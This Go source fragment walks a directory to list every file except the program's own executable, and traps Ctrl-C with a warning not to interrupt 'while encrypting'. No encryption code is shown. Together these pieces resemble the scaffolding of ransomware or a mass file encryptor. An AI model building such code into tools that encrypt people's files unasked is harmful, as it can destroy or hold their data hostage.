package main

import (
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
)

func enumFiles(root string) ([]string, error) {
	var files []string
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		// pass directory
		if info.IsDir() {
			return nil
		}
		// pass itself
		// [2:] strips "./" in "./yourExecutiveFile"
		if info.Name() == os.Args[0][2:] {
			return nil
		}
		files = append(files, path)
		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

func catchSIGINT() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT)
	go func() {
		sig := <-c
		fmt.Printf("Do NOT %v while encrypting\n", sig)
	}()
}
